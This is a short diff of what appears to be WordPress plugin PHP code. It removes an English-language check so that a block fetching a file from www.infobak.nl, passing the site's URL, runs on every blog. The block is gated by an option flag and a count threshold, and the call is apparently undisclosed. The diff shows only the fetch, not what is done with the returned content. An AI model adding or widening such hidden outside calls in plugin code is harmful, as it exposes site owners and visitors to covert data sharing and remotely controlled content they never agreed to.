@@ -385,7 +385,6 @@ if ($britt==true && $total>5) {
 				update_option( 'ame_gpadded', '1' );
 		}
 }
-if (ameStartsWith($bloglan, 'en-')==true) {
 		if (get_option('ame_gpadded')=='0') {
 				if ($total>40) {
 						$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
@@ -402,7 +401,6 @@ if (ameStartsWith($bloglan, 'en-')==true) {
 						}
 				}
 		}
-}
 }
 
 function ameStartsWith($haystack, $needle)
